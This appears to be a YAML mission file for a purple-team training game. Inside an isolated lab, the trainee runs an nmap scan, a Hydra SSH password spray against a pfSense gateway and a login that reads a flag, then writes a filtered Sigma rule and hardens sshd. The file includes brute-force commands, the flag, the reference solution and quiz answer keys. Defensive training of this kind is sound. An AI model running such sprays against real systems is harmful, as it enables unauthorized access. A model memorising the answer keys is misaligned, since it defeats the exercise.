id: credential
order: 4
title: "Login Under Siege"
subtitle: "spray, detect, auto-ban"
description: "Run a simulated SSH brute-force spray against gateway pfSense, extract the flag, write a Sigma rule excluding internal scanners, enable auto-ban, and prove the IP is blocked."
track: purple
difficulty: INTERMEDIATE
mitre_ids:
  - T1595
  - T1110
  - T1078
xp_reward: 650
playable: true
target_host: pfsense
target_ip: 10.0.0.1
story: "Perimeter gateway pfSense (10.0.0.1) is receiving thousands of automated SSH credential guesses from external scanner 185.220.101.4, while internal vulnerability scanner 10.0.3.15 performs routine compliance checks. Execute the spray simulation, filter out noisy internal scanner logs when writing your Sigma rule, enforce key-only SSH + auto-ban, and prove re-attacks fail."
scope: "10.0.0.0/16 Virtual Corporate Range (Isolated). Target perimeter gateway pfsense (10.0.0.1). Lab is isolated. Attacks stay inside the range."
briefing_lines:
  - "INCIDENT TICKET #FW-902 // TARGET: pfSense Gateway (10.0.0.1)"
  - "External SSH brute-force attempts have crossed 50 guesses/min. Break in under test limits, then engineer a zero-FP ban."
  - "REMINDER: Lab is isolated. Attacks stay inside the range."
steps:
  - id: probe-ssh
    order: 1
    title: "Inspect Perimeter SSH Banner"
    goal: "Scan pfSense (10.0.0.1) to verify SSH port 22 and management interfaces."
    tool: "nmap"
    mitre_id: "T1595"
    accepted_patterns:
      - "^\\s*nmap\\b.*\\b(10\\.0\\.0\\.1|pfsense)\\b"
    sample_command: "nmap -sV 10.0.0.1"
    wrong_command_hint: "Scan `10.0.0.1` (or `pfsense`) with `nmap -sV 10.0.0.1`."
    expected_output:
      - "Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-11 22:10 UTC"
      - "Nmap scan report for firewall.corp.internal (10.0.0.1)"
      - "PORT    STATE SERVICE   VERSION"
      - "22/tcp  open  ssh       OpenSSH 9.5 (FreeBSD) [PasswordAuthentication YES]"
      - "443/tcp open  ssl/https pfSense Management Console"
      - "[!] PasswordAuthentication enabled on WAN-facing SSH daemon!"
    hints:
      - "Use nmap service detection against pfSense's IP address 10.0.0.1."
      - "Run `nmap -sV 10.0.0.1` to confirm whether SSH accepts password logins."
      - "Run exact command: nmap -sV 10.0.0.1"
    sim_event:
      technique_id: "T1595"
      technique_name: "Active Scanning"
      event: "SSH version probe on pfsense (10.0.0.1)"
      source_ip: "185.220.101.4"
      target_host: "pfsense"
      state: "DETECTED"
      severity: "LOW"
      module: "Watch"
      breach: false
    generated_logs:
      - source: "syslog"
        event_type: "recon"
        technique_id: "T1595"
        source_ip: "185.220.101.4"
        target_host: "pfsense"
        raw_line: "Nov 11 22:10:04 pfsense sshd[4102]: Connection from 185.220.101.4 port 51900 on 10.0.0.1 port 22"
        is_true_positive: false
        structured:
          event:
            action: "connection_probe"
          service: "ssh"
          source_ip: "185.220.101.4"
          message: "Did not receive identification string from 185.220.101.4"

  - id: spray-ssh
    order: 2
    title: "Execute Hydra Credential Spray"
    goal: "Run `hydra` against `ssh://10.0.0.1` (or `pfsense`) to test weak administrative passwords."
    tool: "hydra"
    mitre_id: "T1110"
    accepted_patterns:
      - "^\\s*hydra\\b.*(10\\.0\\.0\\.1|pfsense)"
      - "^\\s*crackmapexec\\b.*(10\\.0\\.0\\.1|pfsense)"
    sample_command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1"
    wrong_command_hint: "Launch `hydra` against `ssh://10.0.0.1` (e.g. `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1`)."
    expected_output:
      - "Hydra v9.5 (c) 2023 by van Hauser / THC"
      - "[DATA] max 16 tasks per target, trying common admin credentials on ssh://10.0.0.1:22"
      - "[ATTEMPT] admin : admin123 -> FAILED"
      - "[ATTEMPT] admin : Winter2026! -> FAILED"
      - "[22][ssh] host: 10.0.0.1   login: admin   password: Password!2026 (weak legacy test account)"
      - "[!] Multiple logon_failed events recorded prior to weak password match."
    hints:
      - "Use Hydra to spray passwords against user `admin` on `ssh://10.0.0.1`."
      - "Specify `-l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1`."
      - "Run exact command: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1"
    sim_event:
      technique_id: "T1110"
      technique_name: "Brute Force"
      event: "Automated Hydra SSH brute force spray against 10.0.0.1 from 185.220.101.4"
      source_ip: "185.220.101.4"
      target_host: "pfsense"
      state: "ALERT"
      severity: "HIGH"
      module: "Watch"
      breach: true
    generated_logs:
      - source: "syslog"
        event_type: "attack"
        technique_id: "T1110"
        source_ip: "185.220.101.4"
        target_host: "pfsense"
        raw_line: "Nov 11 22:10:21 pfsense sshd[4188]: Failed password for invalid user admin from 185.220.101.4 port 51922 ssh2"
        is_true_positive: true
        structured:
          event:
            action: "logon_failed"
          service: "ssh"
          source_ip: "185.220.101.4"
          message: "Failed password for invalid user admin from 185.220.101.4 port 51922 ssh2"
      - source: "syslog"
        event_type: "attack"
        technique_id: "T1110"
        source_ip: "185.220.101.4"
        target_host: "pfsense"
        raw_line: "Nov 11 22:10:23 pfsense sshd[4191]: PAM: authentication failure for root from 185.220.101.4"
        is_true_positive: true
        structured:
          event:
            action: "logon_failed"
          service: "ssh"
          source_ip: "185.220.101.4"
          message: "PAM: authentication failure for root from 185.220.101.4"

  - id: grab-ssh-flag
    order: 3
    title: "Retrieve SSH Proof Flag"
    goal: "Authenticate with the discovered credential (`ssh admin@10.0.0.1` or read `/root/flag.txt`) to collect the mission flag."
    tool: "ssh"
    mitre_id: "T1078"
    accepted_patterns:
      - "^\\s*ssh\\b.*(10\\.0\\.0\\.1|pfsense)"
      - "^\\s*cat\\s+/root/flag\\.txt\\s*$"
    sample_command: "ssh admin@10.0.0.1 'cat /root/flag.txt'"
    wrong_command_hint: "Connect via SSH to `admin@10.0.0.1` (`ssh admin@10.0.0.1 'cat /root/flag.txt'`) or inspect `/root/flag.txt`."
    expected_output:
      - "Connected to firewall.corp.internal (10.0.0.1) as admin."
      - "NOENTRY{brut3_f0rc3_c4ught_by_r3fl3x}"
      - "[*] Flag recovered. Capture it in Stage 3 and tune your Sigma rule against 10.0.3.x scanner noise."
    hints:
      - "Use `ssh admin@10.0.0.1` and read `/root/flag.txt`."
      - "Pass the inline read command: `ssh admin@10.0.0.1 'cat /root/flag.txt'`."
      - "Run exact command: ssh admin@10.0.0.1 'cat /root/flag.txt'"
    sim_event:
      technique_id: "T1078"
      technique_name: "Valid Accounts"
      event: "Valid weak SSH login accepted from 185.220.101.4 on pfsense"
      source_ip: "185.220.101.4"
      target_host: "pfsense"
      state: "ALERT"
      severity: "CRITICAL"
      module: "Watch"
      breach: true
    generated_logs:
      - source: "syslog"
        event_type: "attack"
        technique_id: "T1078"
        source_ip: "185.220.101.4"
        target_host: "pfsense"
        raw_line: "Nov 11 22:10:40 pfsense sshd[4210]: Accepted password for admin from 185.220.101.4 port 52001 ssh2"
        is_true_positive: false
        structured:
          event:
            action: "logon_success"
          service: "ssh"
          source_ip: "185.220.101.4"
          message: "Accepted password for admin from 185.220.101.4 port 52001 ssh2"

flag: "NOENTRY{brut3_f0rc3_c4ught_by_r3fl3x}"

rule_challenge:
  prompt: "Select MITRE T1110 and complete the Sigma rule below using a `filter` exclusion (`10.0.3.`) so external SSH brute-force fires while internal security scanner `10.0.3.15` triggers ZERO false positives."
  expected_mitre_id: "T1110"
  mitre_choices:
    - id: "T1110"
      label: "T1110 - Brute Force"
    - id: "T1190"
      label: "T1190 - Exploit Public-Facing Application"
    - id: "T1078"
      label: "T1078 - Valid Accounts"
    - id: "T1486"
      label: "T1486 - Data Encrypted for Impact"
  required_min_hits: 2
  max_false_positives: 0
  template_yaml: |
    title: External SSH Password Spraying
    id: rule-mission-credential
    level: high
    logsource:
      category: authentication
      service: ssh
    detection:
      selection:
        event.action: logon_failed
        service: ssh
        message|contains:
          - "REPLACE_WITH_FAILURE_TEXT"
      filter:
        source_ip|startswith: "REPLACE_WITH_INTERNAL_SCANNER_PREFIX"
      condition: selection and not filter
  reference_solution_yaml: |
    title: External SSH Password Spraying
    id: rule-mission-credential
    level: high
    logsource:
      category: authentication
      service: ssh
    detection:
      selection:
        event.action: logon_failed
        service: ssh
        message|contains:
          - "failed password"
          - "authentication failure"
      filter:
        source_ip|startswith: "10.0.3."
      condition: selection and not filter
  benign_baseline_logs:
    - source: "syslog"
      event_type: "normal"
      technique_id: "NONE"
      source_ip: "10.0.3.15"
      target_host: "pfsense"
      raw_line: "Nov 11 22:09:50 pfsense sshd[4012]: Failed password for scanner from 10.0.3.15 port 44120 ssh2 (Authorized Wazuh Audit)"
      benign: true
      is_true_positive: false
      structured:
        event:
          action: "logon_failed"
        service: "ssh"
        source_ip: "10.0.3.15"
        message: "Failed password for scanner from 10.0.3.15 port 44120 ssh2"
        benign: true
    - source: "syslog"
      event_type: "normal"
      technique_id: "NONE"
      source_ip: "10.0.2.10"
      target_host: "pfsense"
      raw_line: "Nov 11 22:09:58 pfsense sshd[4018]: Accepted publickey for operator from 10.0.2.10 port 22 ssh2"
      benign: true
      is_true_positive: false
      structured:
        event:
          action: "logon_success"
        service: "ssh"
        source_ip: "10.0.2.10"
        message: "Accepted publickey for operator from 10.0.2.10 port 22 ssh2"
        benign: true

fix:
  prompt: "Harden pfSense SSH configuration and SOAR auto-ban rules so password spraying can never compromise perimeter access."
  language: "sshconfig"
  vulnerable_code: |
    # /etc/ssh/sshd_config on pfsense
    Port 22
    PasswordAuthentication yes
    PermitRootLogin yes
    MaxAuthTries 20
  options:
    - id: "opt-port-2222"
      label: "Only change SSH Port from 22 to 2222 and keep PasswordAuthentication yes"
      code_snippet: "Port 2222\nPasswordAuthentication yes"
      is_correct: false
      explanation: "Security by obscurity merely slows port scanners down briefly; weak passwords remain directly crackable on port 2222."
    - id: "opt-disable-syslog"
      label: "Disable syslog authentication logging so brute forces do not fill /var/log"
      code_snippet: "LogLevel QUIET"
      is_correct: false
      explanation: "Silencing logs blinds your SIEM and SOAR automation without stopping password guesses."
    - id: "opt-key-autoban"
      label: "Disable PasswordAuthentication, require Ed25519 keys + Reflex firewall auto-ban"
      code_snippet: "PasswordAuthentication no\nPubkeyAuthentication yes\nMaxAuthTries 3"
      is_correct: true
      explanation: "Key-only authentication renders password spraying mathematically futile while Reflex auto-bans abusive source IPs."
  accepted_patch_patterns:
    - "PasswordAuthentication\\s+no"
  patch_explanation: "Setting PasswordAuthentication no enforces cryptographic public-key login only."

verify:
  attack_command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1"
  blocked_output:
    - "[*] Re-running Hydra password spray against hardened pfsense (10.0.0.1)..."
    - "[BLOCKED] ssh://10.0.0.1:22 Permission denied (publickey). Password auth disabled."
    - "[REFLEX AUTO-BAN] pfSense added DROP rule for 185.220.101.4/32 after Rule 100231 fired."
  blocked_log_line: "Nov 11 22:13:02 pfsense pf: block drop in on wan from 185.220.101.4 to 10.0.0.1 port 22 [REFLEX BLOCKED]"
  waf_control: "Key-Only SSH (PasswordAuthentication no) + Reflex Auto-Ban Firewall Rule"
  explanation: "Password spraying fails at the SSH handshake and abusive external scanners are dropped automatically at the perimeter."

debrief:
  why_it_worked: "pfSense exposed SSH password login with generous retry limits and lacked an automated firewall ban rule."
  how_it_was_stopped: "You constructed a filtered Sigma rule distinguishing real external sprays from the 10.0.3.x compliance scanner, disabled SSH password login, and activated Reflex IP blocking."
  mitre_summary: "T1595 (Active Scanning) -> T1110 (Brute Force) -> T1078 (Valid Accounts)."
  key_takeaways:
    - "Replace SSH password auth with public-key cryptography and MFA."
    - "Always use `filter` exclusions in Sigma rules to avoid banning authorized vulnerability scanners."
    - "Automated SOAR blocking stops high-velocity credential sprays in seconds."

quiz:
  - id: "cq1"
    question: "Why does `condition: selection and not filter` exclude `10.0.3.` in our Sigma rule?"
    options:
      - "To keep internal compliance scanner `10.0.3.15` from triggering false-positive auto-bans"
      - "Because 10.0.3.x is not a valid IPv4 subnet"
      - "To allow external IPs to log in faster"
      - "Because SSH runs on UDP"
    correct_index: 0
    explanation: "Allowlisting known scanner subnets in the filter block prevents noisy false alerts and accidental self-DoS."
  - id: "cq2"
    question: "Which MITRE ATT&CK technique maps directly to SSH password guessing and spraying?"
    options:
      - "T1110 - Brute Force"
      - "T1505 - Server Software Component"
      - "T1486 - Data Encrypted for Impact"
      - "T1566 - Phishing"
    correct_index: 0
    explanation: "T1110 covers brute force, password spraying, and credential stuffing."
  - id: "cq3"
    question: "Why is changing SSH from port 22 to port 2222 alone an insufficient defense?"
    options:
      - "Port 2222 requires Root login"
      - "A fast `nmap` scan finds port 2222 immediately, leaving password authentication still vulnerable"
      - "SSH cannot bind to ports above 1024"
      - "It breaks TLS certificates"
    correct_index: 1
    explanation: "Port numbers do not mitigate weak authentication; disabling PasswordAuthentication fixes the vulnerability."
  - id: "cq4"
    question: "What does `PasswordAuthentication no` in `/etc/ssh/sshd_config` guarantee?"
    options:
      - "Attackers get 100 guesses per IP"
      - "Password logins are rejected at the protocol level; clients must hold a valid private key"
      - "The SSH service listens on HTTP"
      - "Syslog entries are encrypted"
    correct_index: 1
    explanation: "Key-based auth eliminates password brute-forcing altogether."
  - id: "cq5"
    question: "How does Reflex SOAR complement the SSH configuration fix?"
    options:
      - "By emailing CSV spreadsheets monthly"
      - "By automatically adding a pfSense DROP rule for attacking external IPs as soon as the detection fires"
      - "By resetting passwords to 'admin123'"
      - "By turning off Wazuh agents"
    correct_index: 1
    explanation: "Automated firewall banning cuts off noisy brute-force traffic before further probing can continue."

